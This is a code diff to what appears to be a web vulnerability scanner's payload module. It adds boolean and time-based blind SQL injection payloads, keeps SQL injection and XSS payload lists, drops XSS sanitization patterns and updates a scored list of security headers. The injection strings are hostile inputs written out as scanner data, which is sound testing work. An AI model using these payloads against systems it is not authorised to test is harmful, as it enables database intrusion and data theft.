@@ -48,6 +48,24 @@ const sqliPayloads = [
     "'; SELECT * FROM users--",
 ];
 
+// Boolean-based blind SQLi — paired payloads evaluated as logically true vs. false.
+// A vulnerable endpoint produces different responses for each.
+const sqliBooleanPairs = [
+    { true: "test' AND '1'='1",    false: "test' AND '1'='2" },
+    { true: "test' AND 1=1--",     false: "test' AND 1=2--" },
+    { true: "test\" AND \"1\"=\"1", false: "test\" AND \"1\"=\"2" },
+    { true: "test) AND (1=1--",    false: "test) AND (1=2--" },
+];
+
+// Time-based blind SQLi — {DELAY} is substituted at runtime with the configured delay in seconds.
+const sqliTimePayloads = [
+    "' OR SLEEP({DELAY})--",
+    "'; WAITFOR DELAY '0:0:{DELAY}'--",
+    "' OR pg_sleep({DELAY})--",
+    "1) OR SLEEP({DELAY})--",
+    "';SELECT pg_sleep({DELAY})--",
+];
+
 // SQL error patterns to detect vulnerabilities
 const sqlErrorPatterns = [
     /SQL syntax.*MySQL/i,
@@ -130,16 +148,6 @@ const xssPayloads = [
     "{{constructor.constructor('alert(1)')()}}",
 ];
 
-// Patterns that indicate XSS protection/sanitization
-const xssSanitizationPatterns = [
-    /&lt;script/i,
-    /&gt;/,
-    /%3C/i,
-    /%3E/i,
-    /&#60;/,
-    /&#62;/,
-];
-
 // Security headers to check
 const securityHeaders = [
     {
@@ -171,13 +179,6 @@ const securityHeaders = [
         points: 5
     },
     {
-        name: 'X-XSS-Protection',
-        key: 'x-xss-protection',
-        importance: 'low',
-        description: 'Browser built-in XSS filter (legacy)',
-        points: 2  // Very low - this header is deprecated
-    },
-    {
         name: 'Referrer-Policy',
         key: 'referrer-policy',
         importance: 'low',
@@ -192,18 +193,26 @@ const securityHeaders = [
         points: 3
     },
     {
-        name: 'X-Permitted-Cross-Domain-Policies',
-        key: 'x-permitted-cross-domain-policies',
+        name: 'Cross-Origin-Opener-Policy',
+        key: 'cross-origin-opener-policy',
+        importance: 'medium',
+        description: 'Isolates browsing context to prevent cross-origin attacks',
+        points: 3
+    },
+    {
+        name: 'Cross-Origin-Resource-Policy',
+        key: 'cross-origin-resource-policy',
         importance: 'low',
-        description: 'Controls Adobe Flash/PDF cross-domain access',
-        points: 1  // Very low - Flash is dead
+        description: 'Restricts which origins can load the resource',
+        points: 2
     }
 ];
 
 module.exports = {
     sqliPayloads,
+    sqliBooleanPairs,
+    sqliTimePayloads,
     sqlErrorPatterns,
     xssPayloads,
-    xssSanitizationPatterns,
     securityHeaders
 };
